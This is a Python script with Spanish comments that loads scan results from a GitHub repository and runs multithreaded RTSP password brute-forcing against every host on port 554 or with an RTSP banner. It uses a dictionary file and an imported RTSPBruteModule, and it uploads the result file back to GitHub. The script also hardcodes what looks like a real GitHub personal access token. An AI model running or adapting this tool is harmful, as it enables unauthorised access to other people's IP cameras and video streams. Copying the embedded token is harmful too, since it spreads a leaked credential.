import os
import json
import time
import requests
import base64
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
from queue import Queue
#from torrentool.api import Torrent

from rtspBrute import RTSPBruteModule
from common import cargar_datos, actualizar_datos

# GitHub API configuration
GITHUB_TOKEN = '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'  # Reemplaza con tu token de acceso personal
REPO_OWNER = 'TreonSearch'         # Reemplaza con tu nombre de usuario de GitHub
REPO_NAME = 'Tron_Json'      # Reemplaza con el nombre de tu repositorio
FILE_PATH = 'datos.json'          # Ruta al archivo JSON que deseas subir
FILE_NAME = 'datos.json'          # Nombre del archivo en GitHub

def download_from_github():
    """Descargar el archivo datos.json desde GitHub si es más grande que el archivo local."""
    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}
    
    # Obtener los metadatos del archivo en GitHub
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        # Obtener tamaño del archivo remoto
        remote_size = response.json()['size']
        print(f'Tamaño del archivo remoto: {remote_size} bytes')

        # Verificar si el archivo local existe y su tamaño
        if os.path.exists(FILE_PATH):
            local_size = os.path.getsize(FILE_PATH)
            print(f'Tamaño del archivo local: {local_size} bytes')

            # Descargar el archivo si el remoto es más grande
            if remote_size > local_size:
                download_url = response.json()['download_url']
                print("El archivo remoto es más grande, descargando...")

                # Descargar el archivo
                download_response = requests.get(download_url)
                with open(FILE_PATH, 'wb') as file:
                    file.write(download_response.content)
                print("Archivo descargado exitosamente desde GitHub.")
        else:
            print("El archivo local no existe, descargando el archivo remoto.")
            download_url = response.json()['download_url']
            download_response = requests.get(download_url)
            with open(FILE_PATH, 'wb') as file:
                file.write(download_response.content)
            print("Archivo descargado exitosamente desde GitHub.")
    else:
        print(f"Error al obtener el archivo de GitHub: {response.content}")

def upload_to_github():
    """Subir el archivo datos.json a GitHub."""
    with open(FILE_PATH, 'r') as file:
        content = file.read()

    # Codificar el contenido del archivo en base64
    encoded_content = base64.b64encode(content.encode()).decode()

    # URL para la API de GitHub
    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_NAME}'
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}

    # Intentar obtener el sha del archivo (en caso de que ya exista)
    response = requests.get(url, headers=headers)
    
    # Si el archivo ya existe, obtenemos el sha
    if response.status_code == 200:
        sha = response.json()['sha']
        data = {
            'message': 'Actualización del archivo datos.json',
            'content': encoded_content,
            'sha': sha,
            'branch': 'main'
        }
    else:
        # Si el archivo no existe, no se incluye sha
        data = {
            'message': 'Subida del archivo datos.json',
            'content': encoded_content,
            'branch': 'main'
        }

    # Subir o actualizar el archivo
    response = requests.put(url, headers=headers, json=data)

    if response.status_code == 201 or response.status_code == 200:
        print("Archivo subido/actualizado correctamente.")
    else:
        print(f"Error al subir el archivo: {response.content}")

class NoCacheHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            super().do_GET()
        except ConnectionAbortedError:
            print("Se ha producido una conexión abortada por el cliente.")

    def end_headers(self):
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        super().end_headers()

def start_http_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, NoCacheHandler)
    print(f'Servidor iniciado en http://127.0.0.1:{port}')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Servidor detenido.")
        httpd.server_close()

def brute_force_worker(q, dictionary_file):
    while True:
        target = q.get()
        if target is None:
            break
        ip, port = target
        brute = RTSPBruteModule()
        brute.setup(targets=[(ip, port)], dictionary_file=dictionary_file)
        brute.run()
        q.task_done()

if __name__ == '__main__':
    # Iniciar el hilo para actualizar datos
    threading.Thread(target=actualizar_datos, daemon=True).start()

    # Iniciar el servidor HTTP en un hilo separado
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()

    json_file = 'datos.json'

    # Descargar el archivo desde GitHub si es necesario
    download_from_github()

    # Subir el JSON al iniciar
    upload_to_github()

    # Cargar los datos
    data = cargar_datos()

    # Filtrar las entradas para obtener solo las que usan el puerto 554 o contienen 'RTSP' en el banner
    targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]

    # Crear una cola para los trabajos de brute force
    q = Queue()
    
    # Enviar los targets a la cola
    for target in targets:
        q.put(target)

    # Crear e iniciar los hilos de brute force
    dictionary_file = "diccionario.txt"  # Asegúrate de que este archivo exista
    num_worker_threads = 4  # Ajusta el número de hilos según sea necesario
    for _ in range(num_worker_threads):
        threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()

    # Esperar a que todos los trabajos se completen
    q.join()

    # Esperar a que el hilo del servidor HTTP termine antes de cerrar el programa principal
    server_thread.join()
